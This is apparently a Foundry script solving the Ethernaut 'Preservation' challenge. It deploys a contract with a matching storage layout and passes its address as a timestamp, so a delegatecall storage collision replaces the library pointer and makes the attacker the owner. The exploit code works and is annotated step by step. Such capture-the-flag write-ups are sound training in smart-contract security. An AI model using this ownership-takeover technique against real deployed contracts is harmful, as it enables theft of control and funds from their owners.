// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Preservation.sol";

contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    constructor() {}

    function setTime(uint256 _time) public {
        owner = msg.sender;
    }
}


contract PreservationScript is Script {

    Preservation public preservation = Preservation(0x66a9f78a675272A627096d389B116C34ab3762D1);

    /**
     * Solution:
     * 1. It's crucial to know how storage and slots work
     * 2. timeZone1Library can be changed by executing setTime because they are at the same slot
     * 3. We deploy malicious contract before that with the corresponding Preservation variables and slots 
     * 4. We should convert the address of the malicious contract to uint256. 
     * uint256 is 32 bytes, the address is only 20 bytes
     * 5. We execute preservation.setFirstTime() and whatever data we pass for timestamp doesn't matter.
     */
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("1. Owner", preservation.owner());

        Attack attack = new Attack();
        uint256 timestamp = uint256(uint160(address(attack)));
        preservation.setFirstTime(timestamp);
        console.log("2. timeZone1Library address", preservation.timeZone1Library());

        preservation.setFirstTime(uint256(0));
        console.log("3. New owner", preservation.owner());
       
        vm.stopBroadcast();

    }
}

